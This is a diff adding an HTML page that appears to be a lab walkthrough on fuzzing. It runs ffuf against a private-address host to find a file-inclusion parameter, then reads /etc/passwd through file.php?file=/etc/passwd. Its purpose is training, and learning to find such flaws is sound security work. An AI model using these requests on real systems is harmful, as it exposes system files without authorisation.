@@ -1,0 +1,16 @@
+<!doctype html><html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>3.2 Fuzzing</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+  
+    <script type="text/javascript">
+        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
+        if (!in_frame()) {
+            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
+            window.location = 'index.html#' + page;
+        }
+    </script>
+</head>
+<body><div class="page"><h1 class="title">3.2 Fuzzing</h1><br/><br />You need to figure out what the paramater on the URL <a href="http://192.168.12.28/file.php?FUZZ=/etc/passwd.">http://192.168.12.28/file.php?</a><a href="http://192.168.12.28/file.php?FUZZ=/etc/passwd.">FUZZ</a><a href="http://192.168.12.28/file.php?FUZZ=/etc/passwd.">=/etc/passwd.</a><br />1. Run on your Kali Machine the following command.<br /><br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$ffuf</span>&nbsp;-c&nbsp;-w&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>usr<span style="color:#a52a2a;font-weight:700">/</span>share<span style="color:#a52a2a;font-weight:700">/</span>seclists<span style="color:#a52a2a;font-weight:700">/</span>Discovery<span style="color:#a52a2a;font-weight:700">/</span>Web-Content<span style="color:#a52a2a;font-weight:700">/</span>common.txt&nbsp;-u&nbsp;http<span style="color:#a52a2a;font-weight:700">://</span>192.168.12.28<span style="color:#a52a2a;font-weight:700">/</span>file.php?FUZZ=<span style="color:#a52a2a;font-weight:700">/</span>etc<span style="color:#a52a2a;font-weight:700">/passwd</span>&nbsp;-fs&nbsp;238<br /></div></div><br /><br /><br />    <span style="color:#ffa500;">Output</span><br />    <img src="images/605-1.png" alt="images/605-1.png" /><br /><br />    The parameter “file” allows the local file inclusion.<br /><br />2. Navigate to <a href="http://192.168.12.28/file.php?file=/etc/passwd.">http://192.168.12.28/file.php?file=/etc/passwd.</a><br />    <img src="images/605-2.png" alt="images/605-2.png" /><br /><br />    You can see the “/etc/passwd” file content.<br /></div></body></html>
